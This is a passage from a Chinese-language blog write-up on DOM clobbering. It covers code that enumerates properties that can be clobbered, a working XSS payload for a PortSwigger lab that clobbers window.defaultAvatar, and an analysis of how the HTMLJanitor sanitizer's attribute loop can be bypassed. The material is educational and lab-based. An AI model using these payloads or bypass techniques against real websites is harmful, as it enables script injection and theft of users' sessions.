class="hljs-string">'\n'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以得到一系列标签字符串类型的属性，例如:</p><p></p><figure class="highlight avrasm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">a:</span>username</span><br><span class="line"><span class="hljs-symbol">a:</span>password</span><br></pre></td></tr></tbody></table></figure><p></p><p>但是这仅仅得到的只是知道它们属性为字符串类型，我们需要知道能不能利用，于是我们需要加上一些东西来进行验证</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">  <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">'string'</span>) {</span><br><span class="line">   <span class="hljs-keyword">try</span> {</span><br><span class="line">    DOM.innerHTML = <span class="hljs-string">'&lt;'</span>+html[i]+<span class="hljs-string">' id=x '</span>+prop+<span class="hljs-string">'=1&gt;'</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>)[prop] == <span class="hljs-number">1</span>) {</span><br><span class="line">       props.push(html[i]+<span class="hljs-string">':'</span>+prop);</span><br><span class="line">    }</span><br><span class="line">    }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">  }</span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">'\n'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以得到一系列的标签以及其属性名称，例如我们可以利用其中的<code>a:title</code>来进行组合</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">title</span>=<span class="hljs-string">'hasaki'</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(x.title);<span class="hljs-comment">//hasaki</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>其中在我们第一步得到的属性中比较有意思的是 a 标签的<code>username</code>跟<code>password</code>属性，虽然我们不能直接通过<code>title</code>这种形式利用，但是我们可以通过<code>href</code>的形式来进行利用：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"ftp:Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.username)<span class="hljs-comment">//Clobbered-username</span></span></span><br><span class="line"><span class="hljs-actionscript">alert(x.password)<span class="hljs-comment">//Clobbered-password</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Exploit-Example"><a href="#Exploit-Example" class="headerlink" title="Exploit Example"></a>Exploit Example</h2><p>PostWigger 提供了两个实验环境 <a href="https://portswigger.net/web-security/dom-based/dom-clobbering，" target="_blank" rel="noopener">https://portswigger.net/web-security/dom-based/dom-clobbering，</a></p><h3 id="Lab-Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Lab-Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Lab: Exploiting DOM clobbering to enable XSS"></a>Lab: Exploiting DOM clobbering to enable XSS</h3><blockquote><p>​    This lab contains a DOM-clobbering vulnerability. The comment functionality allows “safe” HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">XSS</a> to call the alert() function.</p></blockquote><p>这个实验我们可以在<code>resources/js/loadCommentsWithDomPurify.js</code>路由找到这个 JS 文件，在<code>displayComments()</code>函数中我们又可以发现</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> defaultAvatar = <span class="hljs-built_in">window</span>.defaultAvatar || {<span class="hljs-attr">avatar</span>: <span class="hljs-string">'/resources/images/avatarDefault.svg'</span>}</span><br><span class="line"><span class="hljs-keyword">let</span> avatarImgHTML = <span class="hljs-string">'&lt;img class="avatar" src="'</span> + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + <span class="hljs-string">'"&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> divImgContainer = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"div"</span>);</span><br><span class="line">divImgContainer.innerHTML = avatarImgHTML</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里很明显我们可以用 Dom Clobbering 来控制 <code>window.defaultAvatar</code>，只要我们原来没有头像就可以用一个构造一个<code>defaultAvatar.avatar</code>进行 XSS 了。</p><p>根据前面的知识，这是一个两层的层级关系，我们可以用 HTMLCollection 来操作</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span> <span class="hljs-attr">name</span>=<span class="hljs-string">avatar</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里注意<code>"</code>需要进行 HTML实体编码，用 URL 编码的话浏览器会报错<code>1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUND</code>。</p><p>这样评论以后我们可以在自己的评论处看到：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"defaultAvatar"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"avatar"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"defaultAvatar"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们再随便评论一下就好了，就可以触发我们构造的 XSS 了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png" alt=""></p><h3 id="Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Lab:Clobbering DOM attributes to bypass HTML filters"></a>Lab:Clobbering DOM attributes to bypass HTML filters</h3><blockquote><p>​    This lab uses the HTMLJanitor library, which is vulnerable to <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener">DOM clobbering</a>. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim’s browser.</p><p>Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.</p></blockquote><p>这个题目也比较有意思，在<code>resources/js/loadCommentsWithHtmlJanitor.js</code>文件中，我们可以发现代码安全多了，没有明显的直接用<code>Window.x</code>这种代码了</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> janitor = <span class="hljs-keyword">new</span> HTMLJanitor({<span class="hljs-attr">tags</span>: {<span class="hljs-attr">input</span>:{<span class="hljs-attr">name</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">type</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">value</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">form</span>:{<span class="hljs-attr">id</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">i</span>:{},<span class="hljs-attr">b</span>:{},<span class="hljs-attr">p</span>:{}}});</span><br></pre></td></tr></tbody></table></figure><p></p><p>一开始就初始化了<code>HTMLJanitor</code>，只能使用初始化内的标签及其属性，对于重要的输入输出地方都使用了<code>janitor.clean</code>进行过滤。看起来我们没办法很简单地进行 XSS ，那我们就只能来看看<code>resources/js/htmlJanitor.js</code>这个过滤文件了。</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype.clean = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">html</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument(<span class="hljs-string">""</span>);</span><br><span class="line">  <span class="hljs-keyword">const</span> root = sandbox.createElement(<span class="hljs-string">"div"</span>);</span><br><span class="line">  root.innerHTML = html;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(sandbox, root);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> root.innerHTML;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>首先用<code>document.implementation.createHTMLDocument</code>创建了一个新的 HTML 文档用作 sandbox ，然后对于 sandbox 内的元素进行<code>_sanitize</code>过滤。</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype._sanitize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">document, parentNode</span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">var</span> treeWalker = createTreeWalker(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在<code>_sanitize</code>函数一开始调用了<code>createTreeWalker</code>函数创建一个<code>TreeWalker</code>，这个类表示一个当前文档的子树中的所有节点及其位置。</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createTreeWalker</span>(<span class="hljs-params">document, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.createTreeWalker(</span><br><span class="line">    node,</span><br><span class="line">    NodeFilter.SHOW_TEXT |</span><br><span class="line">    NodeFilter.SHOW_ELEMENT |</span><br><span class="line">    NodeFilter.SHOW_COMMENT,</span><br><span class="line">    <span class="hljs-literal">null</span>,</span><br><span class="line">    <span class="hljs-literal">false</span></span><br><span class="line">  );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里的<code>node</code>即为一开始的<code>root</code>，也就是我们构造的<code>html</code>会在传入到<code>node</code>参数，<code>document</code>即为一开始的<code>sandbox</code>，接着进入循环进行判断，对于文本呢绒以及注释进行处理</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.TEXT_NODE) {</span><br><span class="line">true<span class="hljs-comment">//如果此文本节点只是空白，并且上一个或下一个元素同级是`blockElement`，则将其删除</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// 移除所有的注释</span></span><br><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.COMMENT_NODE) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//检查`inlineElement`中是否还有`BlockElement`</span></span><br><span class="line"><span class="hljs-keyword">var</span> isInline = isInlineElement(node);</span><br><span class="line"><span class="hljs-keyword">var</span> containsBlockElement;</span><br><span class="line"><span class="hljs-keyword">if</span> (isInline) {</span><br><span class="line">  containsBlockElement = <span class="hljs-built_in">Array</span>.prototype.some.call(</span><br><span class="line">    node.childNodes,</span><br><span class="line">    isBlockElement</span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//检查`BlockElement`是否嵌套</span></span><br><span class="line"><span class="hljs-keyword">var</span> isNotTopContainer = !!parentNode.parentNode;</span><br><span class="line"><span class="hljs-keyword">var</span> isNestedBlockElement =</span><br><span class="line">    isBlockElement(parentNode) &amp;&amp;</span><br><span class="line">    isBlockElement(node) &amp;&amp;</span><br><span class="line">    isNotTopContainer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> nodeName = node.nodeName.toLowerCase();</span><br><span class="line"><span class="hljs-comment">//获取允许使用的属性</span></span><br><span class="line"><span class="hljs-keyword">var</span> allowedAttrs = getAllowedAttrs(<span class="hljs-keyword">this</span>.config, nodeName, node);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//根据白名单删除标签</span></span><br><span class="line"><span class="hljs-keyword">if</span> (</span><br><span class="line">  isInvalid ||</span><br><span class="line">  shouldRejectNode(node, allowedAttrs) ||</span><br><span class="line">  (!<span class="hljs-keyword">this</span>.config.keepNestedBlockElements &amp;&amp; isNestedBlockElement)</span><br><span class="line">) {</span><br><span class="line">  <span class="hljs-comment">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    !(node.nodeName === <span class="hljs-string">"SCRIPT"</span> || node.nodeName === <span class="hljs-string">"STYLE"</span>)</span><br><span class="line">  ) {</span><br><span class="line">    <span class="hljs-keyword">while</span> (node.childNodes.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">      parentNode.insertBefore(node.childNodes[<span class="hljs-number">0</span>], node);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  parentNode.removeChild(node);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后看到值得我们关注的点：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Sanitize attributes</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a += <span class="hljs-number">1</span>) {</span><br><span class="line">  <span class="hljs-keyword">var</span> attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (shouldRejectAttr(attr, allowedAttrs, node)) {</span><br><span class="line">    node.removeAttribute(attr.name);</span><br><span class="line">    <span class="hljs-comment">// Shift the array to continue looping.</span></span><br><span class="line">    a = a - <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Sanitize children</span></span><br><span class="line"><span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, node);</span><br></pre></td></tr></tbody></table></figure><p></p><p>在这里最终对标签的属性进行了 check ，对 node 的每个属性都进行了白名单检查</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shouldRejectAttr</span>(<span class="hljs-params">attr, allowedAttrs, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> attrName = attr.name.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (allowedAttrs === <span class="hljs-literal">true</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">"function"</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> !allowedAttrs[attrName](attr.value, node);</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">"undefined"</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (allowedAttrs[attrName] === <span class="hljs-literal">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">"string"</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> allowedAttrs[attrName] !== attr.value;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果发现有不在白名单的属性，会使用<code>node.removeAttribute(attr.name);</code>进行删除，然后对子节点进行递归<code>_sanitize</code>。所以有两个思路，要么绕标签过滤，要么绕节点属性过滤。</p><p>标签的获取由<code>treeWalker.firstChild();</code>得到，过滤由<code>getAllowedAttrs</code>以及<code>shouldRejectNode</code>两个函数进行，由于这里的过滤是进行白名单过滤，没什么办法进行绕过；属性的获取在一个<code>for</code>循环当中，条件是<code>node.attributes.length</code>，获取方式是<code>node.attributes[a]</code>，过滤由<code>shouldRejectAttr</code>方法进行。</p><p>对 Dom Clobbering 比较敏感的同学可能会注意到这里，对于 node 属性过滤时的<code>for</code>循环条件，直接使用了<code>node.attributes.length</code>，倘若我们构造的节点正好有一个<code>attributes</code>子节点会怎么样呢？</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'finished'</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>以上这段代码会输出一个<code>NamedNodeMap</code>对象，<code>id='x'</code>以及 finished</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'x'</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'finished'</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>以上这段代码会输出<code>&lt;img name=attributes&gt;</code>以及 finished 